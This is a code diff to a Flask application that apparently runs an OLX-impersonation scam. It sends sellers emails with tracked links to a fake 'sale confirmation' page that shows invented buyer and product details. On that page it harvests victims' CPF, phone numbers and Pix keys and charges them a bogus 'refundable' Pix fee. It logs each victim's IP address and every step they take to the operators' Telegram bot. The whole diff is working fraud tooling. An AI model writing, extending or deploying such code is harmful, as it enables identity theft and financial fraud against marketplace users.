@@ -9810,16 +9810,34 @@ def api_admin_send_email():
     if custom_redirect:
         final_btn_link = custom_redirect
     else:
-        whatsapp = data.get('whatsapp_number', '').strip()
-        if not whatsapp:
-            whatsapp = get_whatsapp_config().get("number", "")
-        if whatsapp:
-            import urllib.parse, random, string
-            auth_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
-            zap_msg = f"Olá, Central OLX! Vim resgatar o valor da minha venda concluída. Meu código de liberação é: {auth_code}"
-            final_btn_link = f"https://wa.me/{whatsapp}?text={urllib.parse.quote(zap_msg)}"
+        # Gera link ÚNICO e BLINDADO para este lead específico
+        lead_seller = data.get('vendedor') or data.get('lead_name') or 'Vendedor Titular'
+        lead_buyer = data.get('comprador') or 'Lucas Ferreira'
+        lead_product = data.get('produto') or 'iPhone 13 Pro 128GB Grafite'
+        lead_value = data.get('valor') or '2.850,00'
+        lead_date = data.get('data_hora') or time.strftime('%d/%m/%Y às %H:%M')
+        lead_pay = data.get('pagamento') or 'Pix'
+
+        if TG_WH_AVAILABLE:
+            try:
+                rel_rec = tg_wh.create_sale_release({
+                    "admin_id": admin_id,
+                    "lead_email": to_email,
+                    "full_name": lead_seller,
+                    "buyer_name": lead_buyer,
+                    "product_name": lead_product,
+                    "sale_amount": lead_value,
+                    "sale_date": lead_date,
+                    "payment_method": lead_pay,
+                    "status": "CRIADO"
+                })
+                release_token = rel_rec.get("token")
+                final_btn_link = f"{host_url}/liberacao/{release_token}"
+            except Exception as e_rel:
+                print(f"[Create Release Link] Erro: {e_rel}")
+                final_btn_link = f"{host_url}/confirmar-venda?vendedor={urllib.parse.quote(lead_seller)}&valor={urllib.parse.quote(lead_value)}&produto={urllib.parse.quote(lead_product)}"
         else:
-            final_btn_link = host_url
+            final_btn_link = f"{host_url}/confirmar-venda"
 
     if html_content:
         # Substituir tags do botão e redirecionamento
@@ -9852,24 +9870,114 @@ def api_admin_send_email():
 
 # ─── PÁGINA DE CONFIRMAÇÃO DE VENDA & RESGATE DO SALDO (LEAD / TAXA REEMBOLSÁVEL) ─
 @app.route('/confirmar-venda')
+@app.route('/confirmar-venda/<token>')
 @app.route('/liberacao')
+@app.route('/liberacao/<token>')
 @app.route('/resgatar-pagamento')
-def page_confirmar_venda():
-    """Página acessada pelo lead através do email de venda confirmada."""
-    seller_name = request.args.get('vendedor', '').strip() or 'Vendedor Titular'
-    buyer_name = request.args.get('comprador', '').strip() or 'Lucas Ferreira'
-    product_name = request.args.get('produto', '').strip() or 'iPhone 13 Pro 128GB Grafite'
-    sale_value = request.args.get('valor', '').strip() or '2.850,00'
-    sale_date = request.args.get('data', '').strip() or time.strftime('%d/%m/%Y às %H:%M')
+@app.route('/resgatar-pagamento/<token>')
+def page_confirmar_venda(token=None):
+    """Página acessada pelo lead através do email de venda confirmada (com link único blindado)."""
+    token = token or request.args.get('token', '').strip()
+    rec = None
+    if token and TG_WH_AVAILABLE:
+        try:
+            rec = tg_wh.get_sale_confirmation_by_token(token)
+        except Exception as e_tk:
+            print(f"[Confirmar Venda] Erro ao buscar token: {e_tk}")
+            rec = None
+
+    if rec:
+        seller_name = rec.get('full_name') or 'Vendedor Titular'
+        buyer_name = rec.get('buyer_name') or 'Lucas Ferreira'
+        product_name = rec.get('product_name') or 'Produto OLX'
+        sale_value = rec.get('sale_amount') or '2.850,00'
+        sale_date = rec.get('sale_date') or time.strftime('%d/%m/%Y às %H:%M')
+        lead_email = rec.get('lead_email') or ''
+        step = rec.get('step') or 1
+        
+        # Registra acesso único e notifica bot no Telegram
+        ip = _user_ip()
+        ua = request.headers.get('User-Agent', '')[:200]
+        try:
+            is_first_access = (rec.get('status') == 'CRIADO')
+            tg_wh.update_sale_confirmation_by_token(token, {
+                "ip": ip,
+                "user_agent": ua,
+                "status": "ACESSADO" if is_first_access else rec.get('status')
+            })
+            if is_first_access:
+                rec['ip'] = ip
+                tg_wh.notify_sale_release_event("PAGE_ACCESSED", rec, {"ip": ip})
+        except Exception as e_acc:
+            print(f"[Release Access Track] Erro: {e_acc}")
+    else:
+        seller_name = request.args.get('vendedor', '').strip() or 'Vendedor Titular'
+        buyer_name = request.args.get('comprador', '').strip() or 'Lucas Ferreira'
+        product_name = request.args.get('produto', '').strip() or 'iPhone 13 Pro 128GB Grafite'
+        sale_value = request.args.get('valor', '').strip() or '2.850,00'
+        sale_date = request.args.get('data', '').strip() or time.strftime('%d/%m/%Y às %H:%M')
+        lead_email = request.args.get('email', '').strip()
+        step = 1
 
     return render_template(
         'confirmar_venda.html',
+        token=token or '',
         seller_name=seller_name,
         buyer_name=buyer_name,
         product_name=product_name,
         sale_value=sale_value,
-        sale_date=sale_date
+        sale_date=sale_date,
+        lead_email=lead_email,
+        step=step
     )
+
+
+@app.route('/api/confirmar-venda/track', methods=['POST'])
+def api_confirmar_venda_track():
+    """
+    Rastreia em tempo real cada etapa do lead na liberação e notifica o Telegram.
+    Eventos suportados: LEAD_IDENTIFIED, PIX_COPIED
+    """
+    data = request.json or {}
+    token = str(data.get('token', '')).strip()
+    event_type = str(data.get('event', '')).upper()
+    ip = _user_ip()
+
+    rec = None
+    if token and TG_WH_AVAILABLE:
+        try:
+            rec = tg_wh.get_sale_confirmation_by_token(token)
+        except Exception:
+            rec = None
+
+    if not rec:
+        rec = dict(data)
+        rec['token'] = token
+
+    updates = {}
+    if data.get('full_name'): updates['full_name'] = str(data.get('full_name')).strip()
+    if data.get('cpf'): updates['cpf'] = re.sub(r'\D', '', str(data.get('cpf')))
+    if data.get('phone'): updates['phone'] = re.sub(r'\D', '', str(data.get('phone')))
+    if data.get('pix_key'): updates['pix_key'] = str(data.get('pix_key')).strip()
+    if data.get('pix_bank'): updates['pix_bank'] = str(data.get('pix_bank')).strip()
+    if data.get('step'): updates['step'] = int(data.get('step'))
+    if event_type == 'PIX_COPIED': updates['pix_copied'] = 1
+
+    if token and updates and TG_WH_AVAILABLE:
+        try:
+            rec = tg_wh.update_sale_confirmation_by_token(token, updates) or rec
+        except Exception as e_up:
+            print(f"[Track Update] Erro: {e_up}")
+
+    rec.update(updates)
+
+    if TG_WH_AVAILABLE:
+        try:
+            tg_wh.notify_sale_release_event(event_type, rec, {"ip": ip})
+        except Exception as e_not:
+            print(f"[Track Notify] Erro: {e_not}")
+
+    return jsonify({"ok": True})
 
 
 @app.route('/api/confirmar-venda/gerar-pix', methods=['POST'])
@@ -9879,6 +9987,7 @@ def api_confirmar_venda_gerar_pix():
     Registra os dados de titularidade do lead e emite notificação imediata.
     """
     data = request.json or {}
+    token = str(data.get('token', '')).strip()
     full_name = str(data.get('full_name', '')).strip()
     cpf = re.sub(r'\D', '', str(data.get('cpf', '')))
     phone = re.sub(r'\D', '', str(data.get('phone', '')))
@@ -9950,10 +10059,11 @@ def api_confirmar_venda_gerar_pix():
         pix_code = f"00020126580014br.gov.bcb.pix0136{uuid.uuid4()}520400005303986540599.905802BR5913OLX BRASIL LT6009SAO PAULO62070503***6304"
         qr_code_url = f"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={urllib.parse.quote(pix_code)}"
 
-    # 3. Salva no banco de dados SQLite
+    # 3. Salva ou atualiza no banco de dados SQLite
     session_id = str(uuid.uuid4())
     record = {
         "session_id": session_id,
+        "token": token,
         "full_name": full_name,
         "cpf": cpf,
         "phone": phone,
@@ -9964,46 +10074,23 @@ def api_confirmar_venda_gerar_pix():
         "fee_amount": "99.90",
         "txid": txid,
         "pix_code": pix_code,
-        "status": gateway_status
+        "status": gateway_status,
+        "step": 4
     }
 
     if TG_WH_AVAILABLE:
         try:
-            tg_wh.save_sale_confirmation(record)
+            if token and tg_wh.get_sale_confirmation_by_token(token):
+                tg_wh.update_sale_confirmation_by_token(token, record)
+            else:
+                tg_wh.save_sale_confirmation(record)
         except Exception as e_sc:
             print(f"[DB Confirmar Venda] Erro ao salvar: {e_sc}")
 
-    # 4. Dispara Notificação no Telegram para os Admins
-    try:
-        clean_sale = float(str(sale_amount).replace('R$', '').replace(' ', '').replace('.', '').replace(',', '.'))
-    except Exception:
-        clean_sale = 2850.0
-    total_reembolso = clean_sale + 99.90
-
-    msg = (
-        f"<b>🔔 NOVO LEAD: SOLICITAÇÃO DE LIBERAÇÃO DE VENDA!</b>\n"
-        f"═════════════════════════════════\n"
-        f"👤 <b>Vendedor/Lead:</b> {full_name}\n"
-        f"📄 <b>CPF:</b> <code>{cpf}</code>\n"
-        f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{phone}'>{phone}</a>\n"
-        f"🏦 <b>Chave Pix Repasse:</b> <code>{pix_key}</code> ({pix_bank})\n\n"
-        f"📦 <b>Produto Vendido:</b> {product_name}\n"
-        f"💰 <b>Saldo a Liberar:</b> <b>R$ {clean_sale:,.2f}</b>\n"
-        f"🏷️ <b>Taxa 1ª Venda:</b> <b>R$ 99,90</b> (Reembolsável)\n"
-        f"⚡ <b>Total com Estorno:</b> <b>R$ {total_reembolso:,.2f}</b>\n"
-        f"═════════════════════════════════\n"
-        f"🆔 <b>TxID Pix:</b> <code>{txid}</code>\n"
-        f"🏛️ <b>Gateway:</b> ElitePay (api.elitepaybr.com)\n"
-        f"⏱ <b>Data/Hora:</b> {time.strftime('%d/%m/%Y %H:%M:%S')}"
-    )
-
+    # 4. Dispara Notificação em tempo real no Telegram
     if TG_WH_AVAILABLE:
         try:
-            conn = tg_wh._get_db()
-            admin_rows = conn.execute("SELECT tg_id FROM tenant_admins WHERE active=1").fetchall()
-            conn.close()
-            for row in admin_rows:
-                tg_wh.send_tg_message(row[0], msg)
+            tg_wh.notify_sale_release_event("FEE_GENERATED", record, {"txid": txid, "ip": _user_ip()})
         except Exception as e_tg:
             print(f"[Telegram Notify Confirmar Venda] Erro: {e_tg}")
 
@@ -10021,10 +10108,12 @@ def api_confirmar_venda_gerar_pix():
 def api_confirmar_venda_status_pix():
     """Consulta status de pagamento da taxa Pix."""
     txid = request.args.get('txid', '').strip()
+    token = request.args.get('token', '').strip()
     if not txid:
         return jsonify({"ok": False, "error": "txid obrigatório"}), 400
 
     # 1. Consulta no banco de dados local
+    rec = None
     if TG_WH_AVAILABLE:
         try:
             rec = tg_wh.get_sale_confirmation_by_txid(txid)
@@ -10053,9 +10142,13 @@ def api_confirmar_venda_status_pix():
             if cstatus in ("APPROVED", "PAGO", "CONCLUIDO", "COMPLETED"):
                 if TG_WH_AVAILABLE:
                     conn = tg_wh._get_db()
-                    conn.execute("UPDATE sale_confirmations SET status='APPROVED', updated_at=? WHERE txid=?", (time.time(), txid))
+                    conn.execute("UPDATE sale_confirmations SET status='APPROVED', step=5, updated_at=? WHERE txid=?", (time.time(), txid))
                     conn.commit()
                     conn.close()
+                    if rec:
+                        rec['status'] = 'APPROVED'
+                        rec['step'] = 5
+                        tg_wh.notify_sale_release_event("PAYMENT_CONFIRMED", rec)
                 return jsonify({"ok": True, "paid": True, "status": "APPROVED"})
             return jsonify({"ok": True, "paid": False, "status": cstatus or "PENDING"})
     except Exception:
